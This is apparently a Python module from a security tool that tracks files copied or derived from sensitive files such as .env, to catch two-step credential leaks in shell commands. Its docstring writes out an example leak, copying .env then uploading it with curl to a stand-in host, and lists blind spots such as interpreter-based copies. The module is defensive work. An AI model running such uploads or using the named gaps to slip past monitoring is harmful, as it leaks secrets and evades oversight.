"""Files derived from sensitive files (two-step leak, reviewer finding 2026-10-11).

`cp .env /tmp/cache.txt` and then `curl -T /tmp/cache.txt https://x` never name `.env` in the
upload, and the secret value never appears in the arguments. So a shell command that reads a
sensitive file (a credential path, or a file already derived from one) taints every file it
writes: redirections, `tee`, `cp`/`mv`/`install`/`ln`/local `rsync` targets, `dd of=`, archive
outputs (`tar -f`, `zip`), `gzip`-style in-place outputs and `-o/--output/-out` values. The
tainted paths live in the provenance scopes (session and workspace, memory only) and count as
sensitive paths in later calls, and in later parts of the same command.

Known limits: a script or interpreter that copies the file (`python -c ...`, a Makefile recipe
the expansion cannot see) is not followed, and only the path string is tracked, so the same
file reached through a different relative path matches only by basename.
"""

from __future__ import annotations

import os
import re
import shlex
from collections.abc import Iterable

from tainttrap.core.advice import split_compound
from tainttrap.core.rules.secrets import scan_sensitive_paths

_COPY = frozenset({"cp", "mv", "install", "ln", "rsync", "ditto"})
_OUT_OPTS = frozenset({"-o", "--output", "-out", "--out", "--output-file", "-O"})
_IN_OPTS = frozenset({"-i", "-in", "--in", "--input", "--infile", "-if"})
_REDIRECT_OUT = frozenset({">", ">>", ">|", "&>", "&>>", "1>", "2>", "1>>", "2>>"})
_INPLACE = {"gzip": ".gz", "bzip2": ".bz2", "xz": ".xz", "zstd": ".zst", "gpg": ".gpg"}
MIN_BASENAME = 5


def _tokens(segment: str) -> list[str]:
    lex = shlex.shlex(segment, posix=True, punctuation_chars="|&;<>")
    lex.whitespace_split = True
    try:
        return list(lex)
    except ValueError:
        # Quoting shlex cannot parse (bash's $'...'): still keep operators apart from their
        # targets, or `>/tmp/copy` would hide the file being written (T141).
        return re.findall(r"[|&;<>]+|[^\s|&;<>]+", segment)


def _pipeline(part: str) -> list[list[str]]:
    out: list[list[str]] = [[]]
    for t in _tokens(part):
        if t in ("|", "|&"):
            out.append([])
        else:
            out[-1].append(t)
    return [s for s in out if s]


def refs(token: str) -> list[str]:
    """Path candidates in a token: itself, after `=`, after `@` (`-F f=@x`, `--data @x`)."""
    out = [token]
    if "=" in token:
        out.append(token.split("=", 1)[1])
    out += [r.lstrip("@") for r in list(out) if r.startswith("@")]
    if ":" in token and not token.startswith(("http://", "https://")):
        out.append(token.split(":", 1)[1])  # scp/rsync host:path
    return [r for r in out if r]


def _norm(path: str) -> str:
    return path[2:] if path.startswith("./") else path


def matches(token: str, derived: Iterable[str]) -> bool:
    names = {_norm(d) for d in derived}
    bases = {os.path.basename(n) for n in names if len(os.path.basename(n)) >= MIN_BASENAME}
    for r in refs(token):
        r = _norm(r)
        if r in names or os.path.basename(r) in bases:
            return True
    return False


def _sensitive(token: str, derived: set[str]) -> bool:
    return any(scan_sensitive_paths(r) for r in refs(token)) or matches(token, derived)


def _segment_io(toks: list[str]) -> tuple[list[str], list[str]]:
    """(inputs, outputs) of one pipeline segment."""
    ins: list[str] = []
    outs: list[str] = []
    i = 0
    while toks and "=" in toks[0] and not toks[0].startswith("-"):
        toks = toks[1:]  # VAR=value prefixes
    if toks[:1] == ["sudo"]:
        toks = toks[1:]
    prog = os.path.basename(toks[0]) if toks else ""
    args: list[str] = []
    while i < len(toks):
        t = toks[i]
        nxt = toks[i + 1] if i + 1 < len(toks) else None
        if t in _REDIRECT_OUT and nxt:
            outs.append(nxt)
            i += 2
            continue
        if t == "<" and nxt:
            ins.append(nxt)
            i += 2
            continue
        if i > 0 and t in _OUT_OPTS and nxt:
            outs.append(nxt)
            i += 2
            continue
        if i > 0 and t in _IN_OPTS and nxt:
            ins.append(nxt)
            i += 2
            continue
        if i > 0:
            args.append(t)
        i += 1
    plain = [a for a in args if not a.startswith("-")]
    if prog in _COPY and len(plain) >= 2:
        target = plain[-1]
        if not (prog == "rsync" and ":" in target):
            outs.append(target)
        ins += plain[:-1]
    elif prog == "tee":
        outs += plain
    elif prog == "dd":
        ins += [a[3:] for a in plain if a.startswith("if=")]
        outs += [a[3:] for a in plain if a.startswith("of=")]
    elif prog in ("tar", "bsdtar"):
        archive = None
        for j, a in enumerate(args):
            flags = a.lstrip("-")
            if not a.startswith("--") and "f" in flags and (a.startswith("-") or j == 0):
                k = j + 1
                archive = args[k] if k < len(args) else None
                break
        if archive:
            outs.append(archive)
        ins += [a for a in plain if a != archive and not set(a) <= set("cxzjvf")]
    elif prog in ("zip", "7z", "7za") and plain:
        rest = plain[1:] if prog == "zip" else plain[2:]
        outs.append(plain[0] if prog == "zip" else (plain[1] if len(plain) > 1 else plain[0]))
        ins += rest
    elif prog in _INPLACE:
        ins += plain
        if not any(a in ("-c", "--stdout", "-d") for a in args):
            outs += [p + _INPLACE[prog] for p in plain]
    else:
        ins += args
    return ins, outs


def part_io(part: str) -> tuple[list[str], list[str]]:
    """(every token, files written) of one top-level part of a command."""
    tokens: list[str] = []
    outs: list[str] = []
    for toks in _pipeline(part):
        tokens += toks
        outs += _segment_io(toks)[1]
    return tokens, outs


def propagate(command: str, derived: set[str]) -> tuple[set[str], bool]:
    """Walk a shell command in order. Returns (files newly derived from sensitive ones, whether
    a part *reads* a derived file). Paths derived in earlier parts count in later parts."""
    known = set(derived)
    new: set[str] = set()
    reads_derived = False
    for part in split_compound(command):
        segments = _pipeline(part)
        tainted = False
        part_outs: list[str] = []
        for toks in segments:
            ins, outs = _segment_io(toks)
            if any(matches(t, known) for t in ins):
                reads_derived = True
            if any(_sensitive(t, known) for t in ins):
                tainted = True
            part_outs += outs
        if tainted:
            fresh = {o for o in part_outs if not _sensitive(o, set())}
            new |= fresh
            known |= fresh
    return new - set(derived), reads_derived
